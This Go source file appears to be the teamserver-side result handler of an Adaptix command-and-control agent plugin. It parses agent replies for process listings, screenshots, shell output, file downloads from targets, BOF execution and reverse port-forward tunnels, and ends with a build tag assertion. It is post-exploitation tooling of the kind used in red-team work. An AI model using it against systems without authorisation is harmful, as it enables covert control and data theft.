								fileData := adaptix.ListingFileDataUnix{
									IsDir:    fi.IsDir,
									Mode:     fi.Mode,
									User:     fi.User,
									Group:    fi.Group,
									Size:     fi.Size,
									Date:     fi.Date,
									Filename: fi.Filename,
								}

								items = append(items, fileData)
							}

							task.Message = fmt.Sprintf("Listing '%s'", params.Path)
							task.ClearText = OutputText
						}
					}
					Ts.TsClientGuiFilesUnix(task, params.Path, items)
				}

			case COMMAND_MKDIR:
				task.Message = "Directory created successfully"

			case COMMAND_MV:
				task.Message = "Object moved successfully"

			case COMMAND_PS:
				var params AnsPs
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}

				if agentData.Os == adaptix.OS_WINDOWS {

					var proclist []adaptix.ListingProcessDataWin

					if !params.Result {
						task.Message = params.Status
						task.MessageType = adaptix.MESSAGE_ERROR
					} else {
						var Processes []PsInfo
						err := msgpack.Unmarshal(params.Processes, &Processes)
						if err != nil {
							continue
						}

						procCount := len(Processes)
						if procCount == 0 {
							task.Message = "Failed to get process list"
							task.MessageType = adaptix.MESSAGE_ERROR
							break
						} else {

							contextMaxSize := 10

							for _, p := range Processes {

								sessId, err := strconv.Atoi(p.Tty)
								if err != nil {
									sessId = 0
								}

								procData := adaptix.ListingProcessDataWin{
									Pid:         uint(p.Pid),
									Ppid:        uint(p.Ppid),
									SessionId:   uint(sessId),
									Arch:        "",
									Context:     p.Context,
									ProcessName: p.Process,
								}

								if len(procData.Context) > contextMaxSize {
									contextMaxSize = len(procData.Context)
								}

								proclist = append(proclist, procData)
							}

							type TreeProc struct {
								Data     adaptix.ListingProcessDataWin
								Children []*TreeProc
							}

							procMap := make(map[uint]*TreeProc)
							var roots []*TreeProc

							for _, proc := range proclist {
								node := &TreeProc{Data: proc}
								procMap[proc.Pid] = node
							}

							for _, node := range procMap {
								if node.Data.Ppid == 0 || node.Data.Pid == node.Data.Ppid {
									roots = append(roots, node)
								} else if parent, ok := procMap[node.Data.Ppid]; ok {
									parent.Children = append(parent.Children, node)
								} else {
									roots = append(roots, node)
								}
							}

							sort.Slice(roots, func(i, j int) bool {
								return roots[i].Data.Pid < roots[j].Data.Pid
							})

							var sortChildren func(node *TreeProc)
							sortChildren = func(node *TreeProc) {
								sort.Slice(node.Children, func(i, j int) bool {
									return node.Children[i].Data.Pid < node.Children[j].Data.Pid
								})
								for _, child := range node.Children {
									sortChildren(child)
								}
							}
							for _, root := range roots {
								sortChildren(root)
							}

							format := fmt.Sprintf(" %%-5v   %%-5v   %%-7v   %%-5v   %%-%vv   %%v", contextMaxSize)
							OutputText := fmt.Sprintf(format, "PID", "PPID", "Session", "Arch", "Context", "Process")
							OutputText += fmt.Sprintf("\n"+format, "---", "----", "-------", "----", "-------", "-------")

							var lines []string

							var formatTree func(node *TreeProc, prefix string, isLast bool)
							formatTree = func(node *TreeProc, prefix string, isLast bool) {
								branch := "├─ "
								if isLast {
									branch = "└─ "
								}
								treePrefix := prefix + branch
								data := node.Data

								line := fmt.Sprintf(format, data.Pid, data.Ppid, data.SessionId, data.Arch, data.Context, treePrefix+data.ProcessName)
								lines = append(lines, line)

								childPrefix := prefix
								if isLast {
									childPrefix += "    "
								} else {
									childPrefix += "│   "
								}

								for i, child := range node.Children {
									formatTree(child, childPrefix, i == len(node.Children)-1)
								}
							}

							for i, root := range roots {
								formatTree(root, "", i == len(roots)-1)
							}

							OutputText += "\n" + strings.Join(lines, "\n")
							task.Message = "Process list:"
							task.ClearText = OutputText
						}
					}
					Ts.TsClientGuiProcessWindows(task, proclist)

				} else {

					var proclist []adaptix.ListingProcessDataUnix

					if !params.Result {
						task.Message = params.Status
						task.MessageType = adaptix.MESSAGE_ERROR
					} else {
						var Processes []PsInfo
						err := msgpack.Unmarshal(params.Processes, &Processes)
						if err != nil {
							continue
						}

						procCount := len(Processes)
						if procCount == 0 {
							task.Message = "Failed to get process list"
							task.MessageType = adaptix.MESSAGE_ERROR
							break
						} else {
							pidFsize := 3
							ppidFsize := 4
							ttyFsize := 3
							contextFsize := 7

							for _, p := range Processes {
								val := fmt.Sprintf("%d", p.Pid)
								if len(val) > pidFsize {
									pidFsize = len(val)
								}
								val = fmt.Sprintf("%d", p.Ppid)
								if len(val) > ppidFsize {
									ppidFsize = len(val)
								}
								if len(p.Tty) > ttyFsize {
									ttyFsize = len(p.Tty)
								}
								if len(p.Context) > contextFsize {
									contextFsize = len(p.Context)
								}

								processData := adaptix.ListingProcessDataUnix{
									Pid:         uint(p.Pid),
									Ppid:        uint(p.Ppid),
									TTY:         p.Tty,
									Context:     p.Context,
									ProcessName: p.Process,
								}

								proclist = append(proclist, processData)
							}

							type TreeProc struct {
								Data     adaptix.ListingProcessDataUnix
								Children []*TreeProc
							}

							procMap := make(map[uint]*TreeProc)
							var roots []*TreeProc

							for _, proc := range proclist {
								node := &TreeProc{Data: proc}
								procMap[proc.Pid] = node
							}

							for _, node := range procMap {
								if node.Data.Ppid == 0 || node.Data.Pid == node.Data.Ppid {
									roots = append(roots, node)
								} else if parent, ok := procMap[node.Data.Ppid]; ok {
									parent.Children = append(parent.Children, node)
								} else {
									roots = append(roots, node)
								}
							}

							sort.Slice(roots, func(i, j int) bool {
								return roots[i].Data.Pid < roots[j].Data.Pid
							})

							var sortChildren func(node *TreeProc)
							sortChildren = func(node *TreeProc) {
								sort.Slice(node.Children, func(i, j int) bool {
									return node.Children[i].Data.Pid < node.Children[j].Data.Pid
								})
								for _, child := range node.Children {
									sortChildren(child)
								}
							}
							for _, root := range roots {
								sortChildren(root)
							}

							format := fmt.Sprintf(" %%-%dv   %%-%dv   %%-%dv   %%-%dv   %%v", pidFsize, ppidFsize, ttyFsize, contextFsize)
							OutputText := fmt.Sprintf(format, "PID", "PPID", "TTY", "Context", "CommandLine")
							OutputText += fmt.Sprintf("\n"+format, "---", "----", "---", "-------", "-----------")

							var lines []string

							var formatTree func(node *TreeProc, prefix string, isLast bool)
							formatTree = func(node *TreeProc, prefix string, isLast bool) {
								branch := "├─ "
								if isLast {
									branch = "└─ "
								}
								treePrefix := prefix + branch
								data := node.Data

								line := fmt.Sprintf(format, data.Pid, data.Ppid, data.TTY, data.Context, treePrefix+data.ProcessName)
								lines = append(lines, line)

								childPrefix := prefix
								if isLast {
									childPrefix += "    "
								} else {
									childPrefix += "│   "
								}

								for i, child := range node.Children {
									formatTree(child, childPrefix, i == len(node.Children)-1)
								}
							}

							for i, root := range roots {
								formatTree(root, "", i == len(roots)-1)
							}

							OutputText += "\n" + strings.Join(lines, "\n")
							task.Message = "Process list:"
							task.ClearText = OutputText
						}
					}
					Ts.TsClientGuiProcessUnix(task, proclist)
				}

			case COMMAND_KILL:
				task.Message = "Process killed"

			case COMMAND_PWD:
				var params AnsPwd
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}
				task.Message = "Current working directory:"
				task.ClearText = params.Path

			case COMMAND_SCREENSHOT:
				var params AnsScreenshots
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}

				count := 0
				if params.Screens != nil {
					count = len(params.Screens)
					if count == 1 {
						_ = Ts.TsScreenshotAdd(agentData.Id, "", params.Screens[0])
					} else {
						for num, screen := range params.Screens {
							_ = Ts.TsScreenshotAdd(agentData.Id, fmt.Sprintf("Monitor %d", num), screen)
						}
					}
				}
				task.Message = fmt.Sprintf("%d screenshots saved", count)

			case COMMAND_SHELL:
				var params AnsShell
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}

				task.Message = "Command output:"
				if agentData.Os == adaptix.OS_WINDOWS {
					task.ClearText = Ts.TsConvertCpToUTF8(params.Output, agentData.OemCP)
				} else {
					task.ClearText = params.Output
				}

			case COMMAND_REV2SELF:
				task.Message = "Token reverted successfully"
				emptyImpersonate := ""
				_ = Ts.TsAgentUpdateDataPartial(agentData.Id, struct {
					Impersonated *string `json:"impersonated"`
				}{Impersonated: &emptyImpersonate})

			case COMMAND_RM:
				task.Message = "Object deleted successfully"

			case COMMAND_UPLOAD:
				var params AnsUpload
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}
				task.Message = fmt.Sprintf("File '%s' successfully uploaded", params.Path)
				Ts.TsClientGuiFilesStatus(task)

			case COMMAND_ZIP:
				var params AnsZip
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}
				task.Message = fmt.Sprintf("Archive '%s' successfully created", params.Path)
				task.MessageType = adaptix.MESSAGE_SUCCESS

			case COMMAND_ERROR:
				var params AnsError
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}
				task.Message = fmt.Sprintf("Error %s", params.Error)
				task.MessageType = adaptix.MESSAGE_ERROR

			case COMMAND_TUNNEL_REVERSE:
				// ★ 批次9：agent 回答「反向端口转发的监听起没起」。
				//   走 Type-1（普通任务结果）而不是 Type-2 —— 它是**对下发任务的回答**，
				//   任务 id 由外层 dispatch 原样带回，这里不需要另造关联 id。
				var params AnsTunnelReverse
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}
				// TsTunnelUpdateRportfwd 返回 (taskId, message, err)，成功即把 GUI 置 Active
				task.TaskId, task.Message, err = Ts.TsTunnelUpdateRportfwd(params.TunnelId, params.Result == 1)
				if err != nil {
					task.MessageType = adaptix.MESSAGE_ERROR
				} else {
					task.MessageType = adaptix.MESSAGE_SUCCESS
				}

			default:
				continue
			}

			outTasks = append(outTasks, task)
		}

	} else if inMessage.Type == 2 {

		if len(inMessage.Object) == 1 {
			err = msgpack.Unmarshal(inMessage.Object[0], &job)
			if err != nil {
				goto HANDLER
			}

			task := taskData
			task.TaskId = job.JobId

			switch job.CommandId {

			case COMMAND_TUNNEL_ACCEPT:

				// ★ 批次9：agent 通告「目标机上有人连进来了，这是新分配的 channelId」。
				//   必须走 Type-2（异步）—— 它**不是**对某个任务的回答，是 agent 主动发起的事件。
				//   服务端在这里才第一次知道 channelId ⇒ 建通道 + 拨 Fhost:Fport
				//   （TsTunnelConnectionAccept → handlerReverseAccept）。
				//   ★ teamserver 必须先完成这一步，agent 随后那条 TUNNEL_PACK 才能过
				//     listener 的 TsTunnelChannelExists 门。
				var params ParamsTunnelAccept
				err := msgpack.Unmarshal(job.Data, &params)
				if err != nil {
					goto HANDLER
				}
				// ★ 批次9d：走 **AcceptDirect**（core 只拨号+登记，**不启 relay**）。
				//   本 agent 的 listener 插件提供独立加密数据通道，core 若在这里启
				//   relaySocketToTunnel(..., false)，那个 G2 就会和 listener 抢读同一条
				//   prSrv，而被抢走的一半交给 gopher 的 TunnelMessageWriteTCP ——
				//   上游占位空壳 ⇒ 首包永久丢失（b''）。窗口期 = agent 这条 ACCEPT
				//   到 listener 收到 TUNNEL_PACK 的**整个往返**，事后 pause 关不死。
				//   ★ exists 守卫：TUNNEL_PACK 可能先到（listener 侧那时已建好同名通道），
				//     此时再 Accept 会**二次拨号 + 二次注册**，必须跳过。
				if !Ts.TsTunnelChannelExists(params.ChannelId) {
					Ts.TsTunnelConnectionAcceptDirect(params.TunnelId, params.ChannelId)
				}
				task.Message = fmt.Sprintf("Reverse port forward: accepted channel %d", params.ChannelId)
				task.MessageType = adaptix.MESSAGE_SUCCESS

			case COMMAND_DOWNLOAD:

				var params AnsDownload
				err := msgpack.Unmarshal(job.Data, &params)
				if err != nil {
					goto HANDLER
				}
				fileId := fmt.Sprintf("%08x", params.FileId)

				if params.Start {
					task.Message = fmt.Sprintf("The download of the '%s' file (%v bytes) has started: [fid %v]", params.Path, params.Size, fileId)
					_ = Ts.TsDownloadAdd(agentData.Id, fileId, params.Path, int64(params.Size))
				}

				_ = Ts.TsDownloadUpdate(fileId, 1, params.Content)

				if params.Finish {
					task.Completed = true

					if params.Canceled {
						task.Message = fmt.Sprintf("Download '%v' successful canceled", fileId)
						_ = Ts.TsDownloadClose(fileId, 4)
					} else {
						task.Message = fmt.Sprintf("File download complete: [fid %v]", fileId)
						_ = Ts.TsDownloadClose(fileId, 3)
					}
				} else {
					goto HANDLER
				}

			case COMMAND_EXEC_BOF_ASYNC:

				var params AnsExecBofAsync
				err := msgpack.Unmarshal(job.Data, &params)
				if err != nil {
					goto HANDLER
				}

				var msgs []BofMsg
				err = msgpack.Unmarshal(params.Msgs, &msgs)
				if err != nil {
					goto HANDLER
				}

				task.Completed = false

				if params.Start {
					task.Message = fmt.Sprintf("Start async BOF [%v]", task.TaskId)
				} else if !params.Finish {
					task.Message = fmt.Sprintf("Async BOF [%v] output", task.TaskId)
				}

				for _, msg := range msgs {

					if msg.Type == CALLBACK_AX_SCREENSHOT {
						buf := bytes.NewReader(msg.Data)
						var length uint32
						if err := binary.Read(buf, binary.LittleEndian, &length); err != nil {
							continue
						}
						note := make([]byte, length)
						if _, err := buf.Read(note); err != nil {
							continue
						}
						screen := make([]byte, len(msg.Data)-4-int(length))
						if _, err := buf.Read(screen); err != nil {
							continue
						}

						_ = Ts.TsScreenshotAdd(agentData.Id, string(note), screen)

					} else if msg.Type == CALLBACK_AX_DOWNLOAD_MEM {
						buf := bytes.NewReader(msg.Data)
						var length uint32
						if err := binary.Read(buf, binary.LittleEndian, &length); err != nil {
							continue
						}
						filename := make([]byte, length)
						if _, err := buf.Read(filename); err != nil {
							continue
						}
						data := make([]byte, len(msg.Data)-4-int(length))
						if _, err := buf.Read(data); err != nil {
							continue
						}
						name := Ts.TsConvertCpToUTF8(string(filename), agentData.ACP)
						fileId := fmt.Sprintf("%08x", mrand.Uint32())

						_ = Ts.TsDownloadSave(agentData.Id, fileId, name, data)

					} else if msg.Type == CALLBACK_ERROR {
						task.MessageType = adaptix.MESSAGE_ERROR
						task.Message = fmt.Sprintf("Async BOF [%v] error", task.TaskId)
						task.ClearText += ensureNewline(Ts.TsConvertCpToUTF8(string(msg.Data), agentData.ACP))
					} else {
						task.ClearText += ensureNewline(Ts.TsConvertCpToUTF8(string(msg.Data), agentData.ACP))
					}
				}

				if params.Finish {
					task.Message = fmt.Sprintf("Async BOF [%v] finished", task.TaskId)
					task.Completed = true
				}

			case COMMAND_RUN:

				var params AnsRun
				err := msgpack.Unmarshal(job.Data, &params)
				if err != nil {
					goto HANDLER
				}

				task.Completed = false

				if params.Start {
					task.Message = fmt.Sprintf("Run process [%v] with pid '%v'", task.TaskId, params.Pid)
				}

				if agentData.Os == adaptix.OS_WINDOWS {
					task.ClearText = Ts.TsConvertCpToUTF8(params.Stdout, agentData.OemCP)
				} else {
					task.ClearText = params.Stdout
				}

				if params.Stderr != "" {
					errorStr := params.Stderr
					if agentData.Os == adaptix.OS_WINDOWS {
						errorStr = Ts.TsConvertCpToUTF8(params.Stderr, agentData.OemCP)
					}
					task.ClearText += fmt.Sprintf("\n --- [error] --- \n%v ", errorStr)
				}

				if params.Finish {
					task.Message = fmt.Sprintf("Process [%v] with pid '%v' finished", task.TaskId, params.Pid)
					task.Completed = true
				}

			default:
				goto HANDLER
			}

			outTasks = append(outTasks, task)
		}
	}

HANDLER:

	/// END CODE

	for _, task := range outTasks {
		Ts.TsTaskUpdate(agentData.Id, task)
	}

	return nil
}
/// ── 构建后传输指纹断言（B-B1）─────────────────────────────────────────────

// 与 src_gopher/transport_libp2p.go、transport_nolibp2p.go 里的 axLibp2pBuildTag
// 一一对应。★ 这是**跨文件**耦合：改一边必须改另一边。断言失败时先怀疑这三个字面量
// 是否还对得上，再怀疑构建。
const (
	axTagLibp2p = "axc2:l2p:enabled:v1"
	axTagStub   = "axc2:l2p:disabled:v1"
)

// axVerifyTransportTag 扫产物字节，确认它带的 transport 变体与 profile 的要求一致。
func axVerifyTransportTag(path string, wantLibp2p bool) error {
	payload, err := os.ReadFile(path)
	if err != nil {
		return fmt.Errorf("build assertion: read %s: %w", path, err)
	}
	hasL2p := bytes.Contains(payload, []byte(axTagLibp2p))
	hasStub := bytes.Contains(payload, []byte(axTagStub))
	// ★ 顺序即语义：**前置条件检查放最前**，且必须写成「两枚都没有」。
	//   第一版把这条写成了 `!wantLibp2p && !hasStub` 并放在第三位 —— 于是
	//   「带 tag 的产物 + profile 不要 libp2p」（hasL2p=true, hasStub=false）
	//   被它**抢先命中**，报出"扫描通道坏了"这个完全错误的理由，最后那条
	//   `!wantLibp2p && hasL2p` 永远求值不到。
	//   ★ 这个错只被"**必须报错、且理由要对**"这一半逮住：只看"是否报错"的话，
	//     ④ 确实报了错 ⇒ 假绿。判据的红/绿之外，**红的理由**也得是判据的一部分。
	switch {
	case !hasL2p && !hasStub:
		return fmt.Errorf("build assertion FAILED: payload has neither %q nor %q - the byte scan itself is not working", axTagLibp2p, axTagStub)
	case wantLibp2p && !hasL2p:
		return fmt.Errorf("build assertion FAILED: profile requests libp2p but payload lacks %q (stub tag present=%v) - `-tags libp2p` did not take effect", axTagLibp2p, hasStub)
	case wantLibp2p && hasStub:
		return fmt.Errorf("build assertion FAILED: payload contains the no-libp2p stub tag %q despite `-tags libp2p`", axTagStub)
	case !wantLibp2p && hasL2p:
		return fmt.Errorf("build assertion FAILED: payload contains %q although no listener profile asked for libp2p", axTagLibp2p)
	}
	return nil
}
